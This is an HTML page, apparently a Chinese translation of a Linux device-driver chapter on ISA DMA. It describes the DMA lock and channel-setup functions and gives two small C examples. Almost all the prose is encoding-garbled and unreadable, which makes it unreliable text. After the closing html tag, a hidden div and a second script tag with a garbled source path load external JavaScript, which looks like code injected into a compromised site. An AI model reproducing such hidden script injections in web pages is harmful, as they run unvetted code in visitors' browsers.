<p>Ҫ DMA ߶дʱ, ߵ׼첽ʱ. ڴʱлӦһ ioctl , ʵֵĲ. չʾĴǵ͵رд豸õ.</p>
<p>һСṩһ DMA ڲĿٸ, ܵĴ. ֪, Ȱ &lt;asm/dma.h&gt; һЩ PC ϵӲֲ. ر, ǲ 8-λ  16-λ ͵. ڱд豸 ISA 豸, Ӧ豸ӲֲҵصϢ.</p>
<p>DMA һԴ, ͼͬʱ̻. Ϊ, һ, Ϊ dma_spin_lock. ӦֱӲ; , 2 ṩ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>unsigned long claim_dma_lock( );</span></span></dt>
<dd><p>ȡ DMA . ڱشж; , ֵһЩ֮ǰж״̬ı־; 뱻ݸĺָж״̬, .</p></dd>
<dt><span class="term"><span>void release_dma_lock(unsigned long flags);</span></span></dt>
<dd><p> DMA һָǰж״̬.</p></dd>
</dl></div>
<p>Ӧ, ʹĺʱ. , Ӧ, ʵʵ I/O . һӦӲ˯ߵһʱ.</p>
<p>뱻صеϢ 3 : RAM ַ, 뱻͵ԭĿ(ֽڻּ), Լ͵ķ. Ϊ, к &lt;asm/dma.h&gt; :</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>void set_dma_mode(unsigned int channel, char mode);</span></span></dt>
<dd><p>ָʾǷͨ豸( DMA_MODE_READ)д豸(DMA_MODE_WRITE). ڵ 3 ģʽ, DMA_MODE_CASCADE, ͷŶߵĿ. ǵ 1 ӵ 2 ķʽ, ҲԱ ISA 豸ʹ. ﲻ߿.</p></dd>
<dt><span class="term"><span>void set_dma_addr(unsigned int channel, unsigned int addr);</span></span></dt>
<dd><p> DMA ĵַ. 洢 addr ĵ 24 Чλڿ. addr һߵַ("ߵַ"һ, ڱǰ).</p></dd>
<dt><span class="term"><span>void set_dma_count(unsigned int channel, unsigned int count);</span></span></dt>
<dd><p>䴫͵ֽ. count Ҳʾ 16-λ ֽͨ; , ż.</p></dd>
</dl></div>
<p>Щ, һЩά߱,  DMA 豸ʱ:</p>
<div class="variablelist"><dl>
<dt><span class="term"><span>void disable_dma(unsigned int channel);</span></span></dt>
<dd><p>һ DMA ͨڿڲر. ͨӦڿΪֹһȷĲǰر. (, Ϊͨ 8-λݴͱ̶ƻ, , , ֮ǰĹܶԶִ.</p></dd>
<dt><span class="term"><span>void enable_dma(unsigned int channel);</span></span></dt>
<dd><p>֪ DMA ͨЧ.</p></dd>
<dt><span class="term"><span>int get_dma_residue(unsigned int channel);</span></span></dt>
<dd><p>ʱҪ֪Ƿһ DMA Ѿ. Ҫ͵ֽ. һγɹĴͺķֵ 0 ڿڹʱǲԤ ( 0). ֲԤҪͨ 2 8-λ 16-λ .</p></dd>
<dt><span class="term"><span>void clear_dma_ff(unsigned int channel) ;</span></span></dt>
<dd><p> DMA flip-flop.  flip-flop ƶ 16-λ ĴĴȡ. ЩĴ 2  8-λȡ,  flip-flop ѡЧֽ()Чֽ(λ). flip-flop ԶתѾ 8 λ; Ա flip-flop( Ϊ֪״̬ )ڴȡ DMA Ĵ֮ǰ.</p></dd>
</dl></div>
<p>ʹЩ, һʵһ׼һ DMA :</p>
<pre class="programlisting">
int dad_dma_prepare(int channel, int mode, unsigned int buf, unsigned int count)
{
 unsigned long flags;

    flags = claim_dma_lock();
 disable_dma(channel);
 clear_dma_ff(channel);
 set_dma_mode(channel, mode);
 set_dma_addr(channel, virt_to_bus(buf));
 set_dma_count(channel, count);
 enable_dma(channel);
 release_dma_lock(flags);
 return 0;
}
</pre>
<p>, һһĺ DMA ĳɹ:</p>
<pre class="programlisting">
int dad_dma_isdone(int channel)
{

int residue;
    unsigned long flags = claim_dma_lock ();
 residue = get_dma_residue(channel);
 release_dma_lock(flags);
    return (residue == 0);
}
</pre>
<p>δɵΨһһ豸. 豸ض񳣳д I/O ˿. 豸ڼķ治ͬ. , һЩ豸ԱӲ DMA ж, ʱòһӲ豸еֵ. Ϊð, ӲֲΨһ.</p>
</div>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id498425" href="#id498425">49</a>] </sup>Ȼ, ʲô鶼; "жϻ"һ 17 , ʾ˸αʹѯõʵ.</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id498543" href="#id498543">50</a>] </sup>Ƭһʳڴļû洢ڴŽ. ͬĸڴ, ÿַռ RAM ɢ, ڻȡĿҳһ DMA .</p></div>
<div class="footnote"><p><sup>[<a name="ftn.id500013" href="#id500013">51</a>] </sup>Щ·оƬһ, Ǽǰ 2  8237 оƬ.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch15s03.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch15.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch15s05.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">15.3.&#160;ֱ I/O&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;15.5.&#160;ٲο</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>